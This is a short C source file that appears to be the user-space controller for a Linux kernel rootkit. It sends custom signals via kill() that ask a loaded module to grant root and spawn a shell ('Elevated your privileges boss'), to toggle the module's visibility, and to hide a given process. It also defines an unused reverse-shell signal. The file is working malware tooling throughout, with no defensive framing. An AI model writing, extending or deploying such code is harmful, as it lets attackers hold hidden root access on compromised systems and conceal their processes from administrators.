#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include <print.h>
enum {
    SIGINVIS = 31,
    SIGSUPER = 64,
    SIGMODINVIS = 63,
    SIGREVSHELL = 60,
};

int kill_superuser() {
	setuid(getuid());
	setgid(getgid());

	int ret = kill(0, SIGSUPER); 
	if (ret == 0) { 
		print_success("Elevated your privileges boss, opening a shell.");
		system("/bin/sh");
	} else {
		print_error("Couldn't elevate your privileges.");
	}

	return ret;
}

int	hide_module() { 
	int ret = kill(0, SIGMODINVIS); 
	
	if (ret == 0) {
		print_success("Successfully toggled module visibility");
	} else {
		print_error("Couldn't toggle module visibility");
	}

	return ret;
} 

int hide_process(int pid) { 
	int ret = kill(pid, SIGINVIS); 
	
	if (ret == 0) {
		print_success("Successfully toggled process visibility");
	} else {
		print_error("Couldn't toggle process visibility");
	}

	return ret;
}

int kill_run(char *action, int pid) {
	
	const char *actions[] = { "superuser", "hide_module", "hide_process", NULL };
	if (action == NULL) {
		print_error("Kill action not specified.");
		print_list("here are all the actions you can do: ", actions);
		return -2;
	}

	if (!strncmp(action, actions[0], 10)) {
		return kill_superuser();
	} else if (!strncmp(action, actions[1], 13)) {
		return hide_module();
	} else if (!strncmp(action, actions[2], 14)) {
		return hide_process(pid);
	}

	print_error("Action doesn't exist.");
	return -2;
}
